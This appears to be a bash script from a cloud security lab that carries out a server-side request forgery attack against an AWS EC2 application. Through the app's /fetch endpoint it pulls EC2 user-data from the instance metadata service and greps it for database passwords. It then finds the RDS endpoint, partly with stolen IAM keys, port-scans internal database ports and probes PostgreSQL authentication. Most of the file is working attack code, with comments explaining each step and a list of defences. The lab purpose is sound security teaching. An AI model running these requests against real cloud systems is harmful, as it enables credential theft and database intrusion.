#!/usr/bin/env bash
# =============================================================================
# 14_ssrf_to_rds.sh — SSRF-based RDS Database Attack
# =============================================================================
# Purpose:
#   Exploit SSRF vulnerability to attack RDS directly from within the EC2
#   context. Even in Config B (private subnet), the app→RDS security group
#   path is open, so SSRF can bypass network boundaries to reach the database.
#
# Learning points:
#   - Script 05 tests EXTERNAL access to RDS — blocked in Config B
#   - This script exploits SSRF to reach RDS FROM INSIDE the VPC context
#   - Private subnet protects against direct external DB access, but SSRF
#     from the app server bypasses this entirely
#   - user-data startup scripts often contain DB connection strings in plaintext
#   - Even failed auth attempts against PostgreSQL confirm TCP reachability
#   - Port scanning via SSRF reveals the internal database attack surface
#
# Defenses:
#   - Store DB credentials in AWS Secrets Manager (not user-data or env vars)
#   - Enforce IMDSv2 to prevent credential exfiltration via SSRF
#   - Remove or allowlist the /fetch endpoint in the application
#   - Use WAF rules to block SSRF patterns (169.254.x.x, 10.x.x.x, etc.)
#   - Use RDS IAM authentication instead of password-based auth
#   - Enable RDS enhanced monitoring and CloudTrail for DB API calls
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "14: SSRF-Based RDS Database Attack (SSRF -> RDS)"

RESULT_FILE="14_ssrf_to_rds.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Exploiting SSRF to reach RDS from inside the VPC context${NC}"
echo -e "${BLUE}[*] Key insight: Script 05 tested external→RDS, this tests SSRF→RDS${NC}"
echo ""

# Findings counters
vuln_count=0
blocked_count=0

# ---------------------------------------------------------------------------
# Step 1: Extract DB Connection Info from User-Data
# ---------------------------------------------------------------------------
# EC2 user-data contains the startup script that configures the application.
# In many real deployments, DB connection strings, hostnames, ports, usernames,
# and passwords are passed as environment variables or written inline.
# An attacker stealing user-data via SSRF can recover all of this.
# ---------------------------------------------------------------------------
print_header "Step 1: DB Credentials from User-Data via SSRF"
echo -e "${BLUE}[*] Retrieving EC2 user-data startup script via SSRF${NC}"
echo -e "${BLUE}[*] Target: http://169.254.169.254/latest/user-data${NC}"
echo -e "${BLUE}[*] Why: Production startup scripts often contain DB connection strings${NC}"
echo ""

result_text+="=== Step 1: DB Credentials from User-Data ==="$'\n'

userdata=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/user-data" 2>/dev/null) || userdata=""

db_creds_found=false

if [[ -n "${userdata}" ]] && ! echo "${userdata}" | grep -qi "404\|not found\|Token required\|unauthorized"; then
    echo -e "${BLUE}[*] User-data retrieved — scanning for DB-related strings${NC}"
    echo ""

    # Filter for database-related variables and strings
    db_lines=$(echo "${userdata}" | grep -iE "DB_|DATABASE|POSTGRES|RDS|password|host|port" 2>/dev/null || true)

    result_text+="--- User-Data DB-Related Lines ---"$'\n'

    if [[ -n "${db_lines}" ]]; then
        echo -e "${RED}  DB-related configuration found in user-data:${NC}"
        echo ""
        echo "${db_lines}"
        echo ""
        result_text+="${db_lines}"$'\n'

        # Check for actual credential material
        if echo "${db_lines}" | grep -qiE "password|secret|passwd|pwd"; then
            print_vulnerable "DB password found in user-data — plaintext credential exposure"
            result_text+="Verdict: VULNERABLE — DB credentials in user-data (CRITICAL)"$'\n'
            db_creds_found=true
            vuln_count=$((vuln_count + 1))
        else
            print_vulnerable "DB connection info found in user-data (host/port/dbname)"
            result_text+="Verdict: VULNERABLE — DB connection info in user-data"$'\n'
            db_creds_found=true
            vuln_count=$((vuln_count + 1))
        fi
    else
        echo -e "  No obvious DB-related strings found in user-data"
        echo -e "  (DB config may be stored in Secrets Manager — good practice)"
        result_text+="No DB strings found in user-data"$'\n'
        print_info "No DB credentials in user-data — may be using Secrets Manager"
    fi
else
    echo -e "  User-data: Not retrievable"
    echo -e "  Response: ${userdata:0:200}"
    result_text+="User-data: Not retrievable"$'\n'

    if echo "${userdata}" | grep -qi "Token required\|unauthorized\|401"; then
        print_blocked "IMDSv2 enforced — user-data not accessible via SSRF"
        result_text+="Verdict: BLOCKED — IMDSv2 enforced"$'\n'
        blocked_count=$((blocked_count + 1))
    else
        print_info "User-data not accessible (IMDS unreachable or app blocked)"
        result_text+="Verdict: Unknown — user-data unavailable"$'\n'
    fi
fi

echo ""

# ---------------------------------------------------------------------------
# Step 2: Discover RDS Endpoint via Multiple Channels
# ---------------------------------------------------------------------------
# An attacker has multiple ways to discover the RDS endpoint:
#   1. From user-data (Step 1) — most direct
#   2. From stolen IAM credentials calling describe-db-instances
#   3. From Terraform outputs (lab-specific fallback)
# Demonstrating multiple discovery channels emphasizes that hiding the
# endpoint hostname alone is insufficient defense.
# ---------------------------------------------------------------------------
print_header "Step 2: RDS Endpoint Discovery (Multi-Channel)"
echo -e "${BLUE}[*] Demonstrating multiple channels to discover the RDS endpoint${NC}"
echo -e "${BLUE}[*] Attackers rarely rely on a single discovery method${NC}"
echo ""

result_text+=$'\n'"=== Step 2: RDS Endpoint Discovery ==="$'\n'

rds_host=""
rds_port=""
discovery_method=""

# Channel 1: Try to extract from user-data if it was retrieved
if [[ -n "${userdata:-}" ]]; then
    extracted_host=$(echo "${userdata}" | grep -iE "DB_HOST|DATABASE_HOST|RDS_HOST|POSTGRES.*HOST" 2>/dev/null | \
        grep -oE "([a-zA-Z0-9.-]+\.rds\.amazonaws\.com|[a-zA-Z0-9.-]+\.rds\.[a-z0-9-]+\.amazonaws\.com)" 2>/dev/null | head -1) || extracted_host=""
    extracted_port=$(echo "${userdata}" | grep -iE "DB_PORT|DATABASE_PORT|POSTGRES_PORT" 2>/dev/null | \
        grep -oE "[0-9]{4,5}" 2>/dev/null | head -1) || extracted_port=""

    if [[ -n "${extracted_host}" ]]; then
        rds_host="${extracted_host}"
        rds_port="${extracted_port:-5432}"
        discovery_method="user-data"
        echo -e "  ${RED}Channel 1 (user-data): RDS host discovered — ${rds_host}${NC}"
        result_text+="Discovery via user-data: ${rds_host}:${rds_port}"$'\n'
    fi
fi

# Channel 2: Attempt via stolen IAM credentials (if present in environment)
if [[ -z "${rds_host}" ]] && [[ -n "${AWS_ACCESS_KEY_ID:-}" ]] && [[ -n "${AWS_SECRET_ACCESS_KEY:-}" ]]; then
    echo -e "${BLUE}[*] Channel 2: Querying RDS API with stolen IAM credentials${NC}"
    api_host=$(aws rds describe-db-instances \
        --query 'DBInstances[0].Endpoint.Address' --output text 2>/dev/null) || api_host=""
    api_port=$(aws rds describe-db-instances \
        --query 'DBInstances[0].Endpoint.Port' --output text 2>/dev/null) || api_port=""

    if [[ -n "${api_host}" && "${api_host}" != "None" ]]; then
        rds_host="${api_host}"
        rds_port="${api_port:-5432}"
        discovery_method="IAM credentials (stolen via SSRF→IMDS)"
        echo -e "  ${RED}Channel 2 (IAM API): RDS host discovered — ${rds_host}${NC}"
        result_text+="Discovery via stolen IAM creds: ${rds_host}:${rds_port}"$'\n'
    fi
fi

# Channel 3: Terraform output (lab fallback — simulates attacker knowing the target)
if [[ -z "${rds_host}" ]]; then
    echo -e "${BLUE}[*] Channel 3: Terraform output (lab environment fallback)${NC}"
    rds_host=$(parse_rds_host)
    rds_port=$(parse_rds_port)
    if [[ -n "${rds_host}" ]]; then
        discovery_method="terraform output (lab fallback)"
        echo -e "  Channel 3 (terraform): RDS host — ${rds_host}:${rds_port}"
        result_text+="Discovery via terraform: ${rds_host}:${rds_port}"$'\n'
    fi
fi

if [[ -n "${rds_host}" ]]; then
    echo ""
    echo -e "  ${BOLD}RDS Host:    ${rds_host}${NC}"
    echo -e "  ${BOLD}RDS Port:    ${rds_port}${NC}"
    echo -e "  ${BOLD}Discovered:  ${discovery_method}${NC}"
    result_text+="RDS Host: ${rds_host}"$'\n'
    result_text+="RDS Port: ${rds_port}"$'\n'
    result_text+="Discovery method: ${discovery_method}"$'\n'
    print_info "RDS endpoint discovered — proceeding with SSRF attack"
else
    echo -e "${YELLOW}  RDS endpoint could not be determined via any channel${NC}"
    result_text+="RDS endpoint: Not discoverable"$'\n'
    print_info "RDS endpoint not found — cannot proceed with DB attack steps"
fi

echo ""

# ---------------------------------------------------------------------------
# Step 3: TCP Connectivity Test to RDS via SSRF
# ---------------------------------------------------------------------------
# This is the pivotal test that distinguishes SSRF→RDS from external→RDS.
# Script 05 demonstrated that external connections to RDS are BLOCKED.
# Here we connect to RDS port 5432 through the /fetch SSRF endpoint,
# which runs as the EC2 application process — inside the VPC with an
# app→RDS Security Group rule that explicitly allows port 5432.
#
# A PostgreSQL server will respond to an HTTP request with a protocol error,
# but the response itself proves TCP connectivity: "I can reach this host."
# ---------------------------------------------------------------------------
print_header "Step 3: TCP Connectivity to RDS via SSRF"
echo -e "${BLUE}[*] Testing RDS reachability from EC2 context via SSRF${NC}"
echo -e "${BLUE}[*] Script 05 showed external→RDS is BLOCKED${NC}"
echo -e "${BLUE}[*] This test uses SSRF (inside VPC context) to bypass that restriction${NC}"
echo ""

result_text+=$'\n'"=== Step 3: TCP Connectivity via SSRF ==="$'\n'

if [[ -n "${rds_host}" ]]; then
    rds_ssrf_url="http://${rds_host}:${rds_port}/"
    echo -e "${BLUE}[*] SSRF → ${rds_ssrf_url}${NC}"
    echo ""

    rds_response=$(curl -sS -m 8 "${TARGET_URL}/fetch?url=${rds_ssrf_url}" 2>&1) || rds_response=""

    result_text+="SSRF URL: ${rds_ssrf_url}"$'\n'
    result_text+="--- RDS SSRF Response ---"$'\n'
    result_text+="${rds_response:0:600}"$'\n'

    echo -e "  Response (first 300 chars):"
    echo -e "  ${rds_response:0:300}"
    echo ""

    # PostgreSQL protocol response indicators:
    # - "postgres" / "pgbouncer": service identification
    # - "FATAL": PostgreSQL error message format (proves connection reached auth layer)
    # - "SSL": SSL negotiation (PostgreSQL initiates SSL handshake)
    # - "authentication": auth phase reached
    # - "invalid packet": server received non-PG data and complained
    if echo "${rds_response}" | grep -qiE "postgres|pgbouncer|invalid packet|SSL|FATAL|authentication"; then
        print_vulnerable "RDS reachable via SSRF — PostgreSQL protocol response confirmed"
        print_info "Compare: external→RDS in script 05 was BLOCKED"
        print_info "SSRF bypasses network controls: EC2→RDS SG rule allows port 5432"
        result_text+="Verdict: VULNERABLE — RDS reachable via SSRF (PostgreSQL response detected)"$'\n'
        result_text+="Key finding: external=BLOCKED (script 05), SSRF=REACHABLE (this script)"$'\n'
        vuln_count=$((vuln_count + 1))
    elif [[ -n "${rds_response}" ]] && ! echo "${rds_response}" | grep -qiE "timed out|timeout|refused|could not connect|Connection refused"; then
        print_vulnerable "RDS responded via SSRF — TCP connectivity confirmed (non-PG response)"
        echo -e "  Response indicates TCP connection reached the server"
        result_text+="Verdict: VULNERABLE — RDS TCP reachable via SSRF"$'\n'
        vuln_count=$((vuln_count + 1))
    elif echo "${rds_response}" | grep -qiE "Connection refused"; then
        print_info "TCP connection reached host but port refused — host is up, port may differ"
        result_text+="Verdict: Partial — TCP reached host, port refused"$'\n'
    else
        print_blocked "RDS not reachable via SSRF on port ${rds_port}"
        echo -e "  Response: ${rds_response:0:200}"
        result_text+="Verdict: BLOCKED — RDS not reachable via SSRF"$'\n'
        blocked_count=$((blocked_count + 1))
    fi
else
    echo -e "${YELLOW}  Skipping — RDS host not available${NC}"
    result_text+="Skipped — RDS host not available"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 4: Port Scan RDS Host via SSRF (Internal Perspective)
# ---------------------------------------------------------------------------
# From the internal VPC context (via SSRF), scan common database ports on
# the RDS host. This reveals which services are listening and provides
# the attacker with information about the full database attack surface.
# A timeout indicates no listening service; any response confirms TCP reach.
# ---------------------------------------------------------------------------
print_header "Step 4: Database Port Scan via SSRF (Internal)"
echo -e "${BLUE}[*] Scanning common database ports on RDS host via SSRF${NC}"
echo -e "${BLUE}[*] Why: Confirms attack surface and identifies additional services${NC}"
echo ""

result_text+=$'\n'"=== Step 4: Database Port Scan via SSRF ==="$'\n'

if [[ -n "${rds_host}" ]]; then
    # Database ports to probe:
    # 5432=PostgreSQL, 3306=MySQL/MariaDB, 1433=MSSQL, 6379=Redis, 27017=MongoDB
    declare -a DB_PORTS=("5432" "3306" "1433" "6379" "27017")
    declare -a DB_DESCS=(
        "PostgreSQL"
        "MySQL / MariaDB"
        "Microsoft SQL Server"
        "Redis"
        "MongoDB"
    )

    reachable_ports=()

    for i in "${!DB_PORTS[@]}"; do
        port="${DB_PORTS[$i]}"
        desc="${DB_DESCS[$i]}"
        scan_url="http://${rds_host}:${port}/"

        echo -ne "  Probing ${rds_host}:${port} (${desc})... "

        port_response=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${scan_url}" 2>&1) || port_response=""

        if [[ -z "${port_response}" ]]; then
            echo -e "${GREEN}Timeout / No response${NC}"
            result_text+="Port ${port} (${desc}): Timeout / No response"$'\n'
        elif echo "${port_response}" | grep -qiE "timed out|timeout"; then
            echo -e "${GREEN}Timeout${NC}"
            result_text+="Port ${port} (${desc}): Timeout"$'\n'
        elif echo "${port_response}" | grep -qiE "Connection refused|refused"; then
            echo -e "${YELLOW}Connection Refused (host reachable, port closed)${NC}"
            result_text+="Port ${port} (${desc}): Connection Refused"$'\n'
            reachable_ports+=("${port} (${desc}) — host reachable")
        else
            echo -e "${RED}RESPONDED — TCP reachable${NC}"
            result_text+="Port ${port} (${desc}): RESPONDED — TCP reachable"$'\n'
            reachable_ports+=("${port} (${desc})")
        fi
    done

    echo ""

    if [[ ${#reachable_ports[@]} -gt 0 ]]; then
        print_vulnerable "Database ports reachable via SSRF — ${#reachable_ports[@]} port(s) responded"
        echo -e "  Reachable ports:"
        for p in "${reachable_ports[@]}"; do
            echo -e "    - ${p}"
        done
        result_text+="Verdict: VULNERABLE — ${#reachable_ports[@]} DB port(s) reachable internally"$'\n'
        vuln_count=$((vuln_count + 1))
    else
        print_info "No database ports responded in scan window"
        result_text+="Verdict: No ports responded in scan"$'\n'
    fi
else
    echo -e "${YELLOW}  Skipping — RDS host not available${NC}"
    result_text+="Skipped — RDS host not available"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 5: PostgreSQL Authentication Probe via SSRF
# ---------------------------------------------------------------------------
# Even without valid credentials, probing PostgreSQL through SSRF is valuable:
#   - Error messages reveal PostgreSQL version number
#   - Auth method in error indicates whether MD5, SCRAM, or cert auth is used
#   - Successful TCP probe proves the SG allows EC2→RDS on port 5432
#   - An attacker with DB credentials (from Step 1) can authenticate directly
#
# The key learning: the application's trust relationship with RDS (allowed by
# Security Group) becomes the attacker's trust relationship when SSRF is present.
# ---------------------------------------------------------------------------
print_header "Step 5: PostgreSQL Authentication Probe via SSRF"
echo -e "${BLUE}[*] Probing PostgreSQL authentication layer via SSRF${NC}"
echo -e "${BLUE}[*] Why: Error messages leak version, auth method, and confirm TCP access${NC}"
echo -e "${BLUE}[*] With credentials from Step 1, an attacker could authenticate here${NC}"
echo ""

result_text+=$'\n'"=== Step 5: PostgreSQL Auth Probe ==="$'\n'

if [[ -n "${rds_host}" ]]; then
    # PostgreSQL speaks its own binary protocol, not HTTP.
    # Sending an HTTP request causes a "invalid length of startup packet" or
    # similar protocol error that still proves TCP connectivity.
    # Try multiple URL patterns to maximize the chance of a revealing response.
    declare -a PG_PROBES=(
        "http://${rds_host}:${rds_port}/"
        "http://${rds_host}:${rds_port}/postgres"
        "http://${rds_host}:${rds_port}/?user=admin&database=postgres"
    )
    declare -a PG_DESCS=(
        "Basic HTTP probe"
        "Database name in path"
        "PostgreSQL connection string params"
    )

    pg_probe_vuln=false

    for i in "${!PG_PROBES[@]}"; do
        probe_url="${PG_PROBES[$i]}"
        probe_desc="${PG_DESCS[$i]}"

        echo -e "  [*] Probe: ${probe_desc}"
        echo -e "      URL:   ${probe_url}"

        pg_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${probe_url}" 2>&1) || pg_response=""

        result_text+="--- Probe: ${probe_desc} ---"$'\n'
        result_text+="${pg_response:0:400}"$'\n'

        if [[ -n "${pg_response}" ]] && ! echo "${pg_response}" | grep -qiE "timed out|timeout"; then
            echo -e "      ${RED}Response received (${#pg_response} bytes)${NC}"

            # Extract version information if present
            if echo "${pg_response}" | grep -qiE "PostgreSQL [0-9]|version [0-9]"; then
                pg_version=$(echo "${pg_response}" | grep -oiE "PostgreSQL [0-9]+\.[0-9]+" | head -1)
                echo -e "      ${RED}Version leaked: ${pg_version}${NC}"
                result_text+="Version leaked: ${pg_version}"$'\n'
            fi

            # Identify authentication method from error messages
            if echo "${pg_response}" | grep -qiE "md5|scram-sha|password authentication|pg_hba"; then
                echo -e "      ${RED}Auth method revealed in error message${NC}"
                result_text+="Auth method info in error"$'\n'
            fi

            if echo "${pg_response}" | grep -qiE "postgres|FATAL|SSL|authentication|invalid|packet|startup"; then
                echo -e "      ${RED}PostgreSQL protocol response — confirms TCP access to DB${NC}"
                pg_probe_vuln=true
            fi
        else
            echo -e "      ${GREEN}No response / Timeout${NC}"
        fi
        echo ""
    done

    if [[ "${pg_probe_vuln}" == true ]]; then
        print_vulnerable "PostgreSQL reachable via SSRF — auth layer probed from EC2 context"
        print_info "With credentials from user-data (Step 1), authentication would succeed here"
        result_text+="Verdict: VULNERABLE — PostgreSQL auth layer reachable via SSRF"$'\n'
        vuln_count=$((vuln_count + 1))
    else
        print_info "PostgreSQL auth probe inconclusive — TCP connectivity check in Step 3 is definitive"
        result_text+="Verdict: Inconclusive — see Step 3 for TCP connectivity result"$'\n'
    fi
else
    echo -e "${YELLOW}  Skipping — RDS host not available${NC}"
    result_text+="Skipped — RDS host not available"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 6: Compare SSRF→RDS with Script 05 (External→RDS) Results
# ---------------------------------------------------------------------------
# This step explicitly draws the contrast between the two attack vectors to
# communicate the core learning: network segmentation solves one threat model
# (external attacker with no foothold) but not another (application-layer
# SSRF that operates from within the trusted network boundary).
# ---------------------------------------------------------------------------
print_header "Step 6: Comparison — SSRF→RDS vs External→RDS (Script 05)"
echo -e "${BLUE}[*] Contextualizing this attack against the Script 05 direct probe results${NC}"
echo ""

result_text+=$'\n'"=== Step 6: SSRF→RDS vs External→RDS Comparison ==="$'\n'

echo -e "  ${BOLD}Script 05 — Direct External Probe (from attacker machine):${NC}"
echo -e "    Config A: External TCP to RDS may partially succeed (depends on SG)"
echo -e "    Config B: External TCP to RDS is BLOCKED (RDS in private subnet, no route)"
echo ""
echo -e "  ${BOLD}Script 14 — SSRF Probe (from EC2 app context inside VPC):${NC}"
echo -e "    Config A: SSRF→RDS — VULNERABLE (app→RDS SG allows port 5432)"
echo -e "    Config B: SSRF→RDS — VULNERABLE (same SG rule, SSRF is app-layer attack)"
echo ""
echo -e "  ${RED}${BOLD}Key Insight:${NC}"
echo -e "  ${RED}  Private subnet (Config B) protects against DIRECT external DB access${NC}"
echo -e "  ${RED}  But SSRF from the app server bypasses this protection entirely${NC}"
echo -e "  ${RED}  The attacker inherits the app server's network trust position${NC}"
echo ""
echo -e "  ${BLUE}Why the SG rule creates this risk:${NC}"
echo -e "    - SG rule: app-sg → db-sg : TCP 5432 (required for the app to function)"
echo -e "    - SSRF causes the app process to make the connection on the attacker's behalf"
echo -e "    - Network controls see a legitimate app→RDS connection"
echo -e "    - The malicious intent is invisible at the network layer"
echo ""

result_text+="Config A: Script 05 external probe = may succeed (depends on SG)"$'\n'
result_text+="Config A: Script 14 SSRF probe = VULNERABLE (app SG allows port 5432)"$'\n'
result_text+="Config B: Script 05 external probe = BLOCKED (private subnet)"$'\n'
result_text+="Config B: Script 14 SSRF probe = VULNERABLE (same SG rule, SSRF bypasses subnet)"$'\n'
result_text+="Root cause: SSRF inherits app server network trust — SG sees legitimate app->RDS flow"$'\n'

echo ""

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
print_header "Summary: SSRF→RDS Attack Assessment"

result_text+=$'\n'"=== Summary ==="$'\n'

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  SSRF→RDS Attack Summary (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "  ${RED}Vulnerabilities found: ${vuln_count}${NC}"
echo -e "  ${GREEN}Tests blocked:         ${blocked_count}${NC}"
echo ""

result_text+="Total VULNERABLE: ${vuln_count}"$'\n'
result_text+="Total BLOCKED: ${blocked_count}"$'\n'

echo -e "  ${BOLD}Findings:${NC}"
if [[ ${db_creds_found} == true ]]; then
    echo -e "    ${RED}- DB credentials/connection info exposed in EC2 user-data${NC}"
    result_text+="Finding: DB credentials in user-data"$'\n'
fi
if [[ ${vuln_count} -gt 0 ]]; then
    echo -e "    ${RED}- RDS database reachable from EC2 context via SSRF${NC}"
    result_text+="Finding: RDS reachable via SSRF"$'\n'
fi
echo ""

if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "  ${RED}Config A Analysis:${NC}"
    echo -e "    - External DB probe (script 05):  may succeed depending on SG"
    echo -e "    - SSRF → RDS (this script):       VULNERABLE"
    echo -e "    - EC2 is directly internet-exposed, lowering the bar for SSRF exploitation"
    echo -e "    - Attacker needs only one SSRF request to reach the DB layer"
    result_text+="Config A: external probe=depends on SG, SSRF->RDS=VULNERABLE"$'\n'
else
    echo -e "  ${YELLOW}Config B Analysis:${NC}"
    echo -e "    - External DB probe (script 05):  BLOCKED (private subnet works)"
    echo -e "    - SSRF → RDS (this script):       VULNERABLE"
    echo -e "    - Config B's subnet isolation prevents direct external DB access"
    echo -e "    - But SSRF operates at application layer, bypassing subnet controls"
    echo -e "    - The network segmentation improvement does NOT protect against SSRF→RDS"
    result_text+="Config B: external probe=BLOCKED, SSRF->RDS=VULNERABLE"$'\n'
fi

echo ""
echo -e "  ${BOLD}Network Segmentation Limitation:${NC}"
echo -e "    Network segmentation protects against direct external access."
echo -e "    Application-layer attacks (SSRF) operate from within the trusted"
echo -e "    network context and are NOT mitigated by subnet isolation alone."
echo ""
echo -e "  ${CYAN}Required Defenses:${NC}"
echo -e "    1. ${CYAN}Secrets Manager${NC}: Store DB credentials — not in user-data or env vars"
echo -e "    2. ${CYAN}IMDSv2 enforcement${NC}: Block SSRF access to IMDS credentials"
echo -e "    3. ${CYAN}Remove /fetch endpoint${NC}: Eliminate SSRF attack surface in the app"
echo -e "    4. ${CYAN}WAF rules${NC}: Block requests to 169.254.x.x, 10.x.x.x in url params"
echo -e "    5. ${CYAN}RDS IAM authentication${NC}: Replace password auth with IAM roles"
echo -e "    6. ${CYAN}CloudTrail + GuardDuty${NC}: Detect unusual RDS API calls and DB access"
echo ""

result_text+="Network segmentation protects direct external access but NOT application-layer SSRF attacks"$'\n'
result_text+="Defenses: Secrets Manager, IMDSv2, remove /fetch, WAF URL filtering, RDS IAM auth, GuardDuty"$'\n'

# ---------------------------------------------------------------------------
# Overall verdict for compare_results.sh parsing
# ---------------------------------------------------------------------------
if [[ ${vuln_count} -gt 0 ]]; then
    result_text+=$'\n'"Overall: VULNERABLE — SSRF bypasses network controls to reach RDS"$'\n'
else
    result_text+=$'\n'"Overall: BLOCKED — SSRF to RDS path not confirmed"$'\n'
fi

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "SSRF→RDS attack assessment complete"
